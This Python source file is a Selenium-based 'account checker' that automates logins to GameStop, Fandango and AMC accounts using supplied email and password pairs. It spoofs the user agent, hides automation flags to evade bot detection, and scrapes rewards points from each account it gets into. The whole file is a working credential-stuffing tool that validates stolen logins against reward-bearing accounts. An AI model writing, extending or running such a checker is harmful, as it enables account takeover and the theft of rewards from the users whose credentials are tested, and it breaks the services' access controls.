#!/usr/bin/env python3
"""
Selenium-based Account Checker for services requiring browser automation
Optimized for speed with headless mode and parallel execution
"""

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException
from selenium.webdriver.chrome.options import Options
import concurrent.futures
import time
from typing import Optional, Dict, Tuple
from dataclasses import dataclass
import threading


@dataclass
class SeleniumResult:
    """Result from Selenium check."""
    email: str
    password: str
    service: str
    success: bool
    balance: Optional[str] = None
    points: Optional[str] = None
    error: Optional[str] = None


class SeleniumChecker:
    """Base Selenium checker with optimizations."""

    def __init__(self, headless: bool = True, timeout: int = 10):
        self.headless = headless
        self.timeout = timeout
        self.driver_lock = threading.Lock()

    def _create_driver(self):
        """Create optimized Chrome driver."""
        options = Options()
        if self.headless:
            options.add_argument('--headless=new')
        options.add_argument('--disable-gpu')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-blink-features=AutomationControlled')
        options.add_argument('user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')

        # Performance optimizations
        options.add_argument('--disable-extensions')
        options.add_argument('--disable-images')
        options.page_load_strategy = 'eager'

        return webdriver.Chrome(options=options)

    def check(self, email: str, password: str) -> SeleniumResult:
        """Override in subclass."""
        raise NotImplementedError


class GameStopChecker(SeleniumChecker):
    """GameStop PowerUp Rewards checker."""

    def check(self, email: str, password: str) -> SeleniumResult:
        """Check GameStop account."""
        driver = self._create_driver()
        try:
            driver.get("https://www.gamestop.com/login")

            # Wait for login form
            wait = WebDriverWait(driver, self.timeout)

            # Fill credentials
            email_field = wait.until(
                EC.presence_of_element_located((By.ID, "login-form-email"))
            )
            email_field.send_keys(email)

            password_field = driver.find_element(By.ID, "login-form-password")
            password_field.send_keys(password)

            # Submit
            submit_btn = driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
            submit_btn.click()

            time.sleep(2)

            # Check for success (account page loaded)
            try:
                wait.until(EC.url_contains("/account"))

                # Try to get points balance
                try:
                    points_elem = driver.find_element(By.CSS_SELECTOR, ".points-balance")
                    points = points_elem.text
                except:
                    points = None

                return SeleniumResult(
                    email=email,
                    password=password,
                    service='GameStop',
                    success=True,
                    points=points
                )
            except TimeoutException:
                # Check for error message
                try:
                    error_elem = driver.find_element(By.CSS_SELECTOR, ".error-message")
                    error = error_elem.text
                except:
                    error = "Login failed"

                return SeleniumResult(
                    email=email,
                    password=password,
                    service='GameStop',
                    success=False,
                    error=error
                )

        except Exception as e:
            return SeleniumResult(
                email=email,
                password=password,
                service='GameStop',
                success=False,
                error=str(e)
            )
        finally:
            driver.quit()


class FandangoChecker(SeleniumChecker):
    """Fandango VIP checker."""

    def check(self, email: str, password: str) -> SeleniumResult:
        """Check Fandango account."""
        driver = self._create_driver()
        try:
            driver.get("https://www.fandango.com/accounts/login")
            wait = WebDriverWait(driver, self.timeout)

            # Fill email
            email_field = wait.until(
                EC.presence_of_element_located((By.NAME, "email"))
            )
            email_field.send_keys(email)

            # Fill password
            password_field = driver.find_element(By.NAME, "password")
            password_field.send_keys(password)

            # Submit
            submit_btn = driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
            submit_btn.click()

            time.sleep(2)

            # Check success
            try:
                wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, ".user-menu")))

                # Try to get VIP points
                try:
                    driver.get("https://www.fandango.com/vip")
                    time.sleep(1)
                    points_elem = driver.find_element(By.CSS_SELECTOR, ".vip-points")
                    points = points_elem.text
                except:
                    points = None

                return SeleniumResult(
                    email=email,
                    password=password,
                    service='Fandango',
                    success=True,
                    points=points
                )
            except TimeoutException:
                return SeleniumResult(
                    email=email,
                    password=password,
                    service='Fandango',
                    success=False,
                    error="Login failed"
                )

        except Exception as e:
            return SeleniumResult(
                email=email,
                password=password,
                service='Fandango',
                success=False,
                error=str(e)
            )
        finally:
            driver.quit()


class AMCChecker(SeleniumChecker):
    """AMC Stubs checker."""

    def check(self, email: str, password: str) -> SeleniumResult:
        """Check AMC account."""
        driver = self._create_driver()
        try:
            driver.get("https://www.amctheatres.com/sign-in")
            wait = WebDriverWait(driver, self.timeout)

            # Fill credentials
            email_field = wait.until(
                EC.presence_of_element_located((By.NAME, "email"))
            )
            email_field.send_keys(email)

            password_field = driver.find_element(By.NAME, "password")
            password_field.send_keys(password)

            # Submit
            submit_btn = driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
            submit_btn.click()

            time.sleep(2)

            # Check success
            try:
                wait.until(EC.url_contains("/account"))

                # Get points
                try:
                    points_elem = driver.find_element(By.CSS_SELECTOR, ".stubs-points")
                    points = points_elem.text
                except:
                    points = None

                return SeleniumResult(
                    email=email,
                    password=password,
                    service='AMC',
                    success=True,
                    points=points
                )
            except TimeoutException:
                return SeleniumResult(
                    email=email,
                    password=password,
                    service='AMC',
                    success=False,
                    error="Login failed"
                )

        except Exception as e:
            return SeleniumResult(
                email=email,
                password=password,
                service='AMC',
                success=False,
                error=str(e)
            )
        finally:
            driver.quit()


def check_account_selenium(email: str, password: str,
                          service: str, headless: bool = True) -> SeleniumResult:
    """Check account using appropriate Selenium checker."""
    checkers = {
        'gamestop': GameStopChecker,
        'fandango': FandangoChecker,
        'amc': AMCChecker,
    }

    checker_class = checkers.get(service.lower())
    if not checker_class:
        return SeleniumResult(
            email=email,
            password=password,
            service=service,
            success=False,
            error="Service not supported"
        )

    checker = checker_class(headless=headless)
    return checker.check(email, password)


if __name__ == '__main__':
    # Test
    result = check_account_selenium(
        "test@example.com",
        "password123",
        "gamestop"
    )
    print(f"Success: {result.success}")
    print(f"Points: {result.points}")
